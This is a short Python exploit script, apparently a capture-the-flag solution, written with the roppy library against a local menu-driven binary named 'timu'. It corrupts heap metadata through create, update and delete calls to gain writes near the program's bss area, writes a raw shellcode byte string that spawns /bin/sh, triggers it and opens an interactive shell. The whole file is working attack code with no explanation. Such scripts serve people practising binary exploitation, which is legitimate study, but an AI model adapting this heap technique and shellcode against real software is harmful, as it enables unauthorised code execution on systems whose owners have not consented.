from roppy import *


#context.arch = "amd64"

def create(size, data):
    p.sendlineafter("choice :", "1")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)

def update(idx, size, data):
    p.sendlineafter("choice :", "3")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)

def delete(idx):
    p.sendlineafter("choice :", "2")
    p.sendlineafter(": ", str(idx))


p = process("./timu")
elf = ELF("timu")

bss = 0x601040
    
shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'


create(0x60, "A"*8)
create(0x80, "B"*8)
create(0x80, "C"*8)

delete(1)

update(1, 0x10, p64(bss + 0x20)*2)
create(0x80, "D"*8)
delete(0)
update(0, 0x8, p64(0x60106d))
create(0x60,'3333')
create(0x60,b'aaa'+p64(0x601070)+p64(0x601080))
update(8,1,p64(0x10))
update(6,8,p64(0x601080))

update(9,len(shellcode),shellcode)
p.sendlineafter("choice :", "1")
p.sendlineafter(":", "1")
p.interactive()
